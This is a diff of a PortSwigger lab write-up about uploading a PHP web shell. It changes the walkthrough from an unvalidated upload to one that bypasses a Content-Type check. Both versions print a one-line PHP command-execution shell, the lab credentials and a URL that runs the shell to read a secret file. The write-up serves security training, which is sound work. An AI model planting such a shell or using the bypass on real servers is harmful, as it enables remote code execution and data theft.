@@ -1,31 +1,23 @@
-# Lab: Remote Code Execution via Web Shell Upload
+# Lab: Web Shell Upload via Content-Type Restriction Bypass
 
 **Difficulty:** Apprentice | **Category:** File Upload Vulnerabilities
 
-The goal was to upload a PHP web shell and use it to read `/home/carlos/secret`.
+The goal was to bypass a file type restriction, upload a PHP web shell, and read `/home/carlos/secret`.
 
-Opened the site and looked for anywhere I could upload something. Found the profile picture upload after logging in with the provided credentials `wiener:peter`. Created a PHP web shell in the terminal:
-
-```bash
-nano portswiggerexploit.php
-```
+Logged in with `wiener:peter` and went to the profile section. Tried uploading the PHP web shell directly:
 
 ```php
 <?php echo system($_GET['command']); ?>
 ```
 
-Uploaded it as a profile picture — the server accepted it with no validation. Checked Burp Suite's HTTP history to find where the file was stored. When a website loads a profile picture, it fetches it from a path on the server — that's how the file location was found:
+The server rejected it — only `image/jpeg` and `image/png` content types were allowed. Captured the upload request in Burp Suite's HTTP history, sent it to Repeater, and changed the `Content-Type` header from `application/x-php` to `image/png`. Sent the request — server responded with `200 OK`, file uploaded.
 
-```
-/files/avatars/portswiggerexploit.php
-```
-
-Called the shell directly in the browser to read the secret:
+Called the shell directly in the browser:
 
 ```
 https://<lab-id>.web-security-academy.net/files/avatars/portswiggerexploit.php?command=cat%20/home/carlos/secret
 ```
 
-The output returned the secret — lab solved.
+Server returned the secret — submitted it and the lab was solved.
 
-**Key takeaway:** The server stored uploaded files directly in a web-accessible directory with zero validation, making it possible to upload and execute a PHP script just by visiting its URL.
+**Key takeaway:** The server only checked the `Content-Type` header to validate the file type, which is user-controllable. Changing it to `image/png` while keeping the PHP payload intact was enough to bypass the restriction entirely.
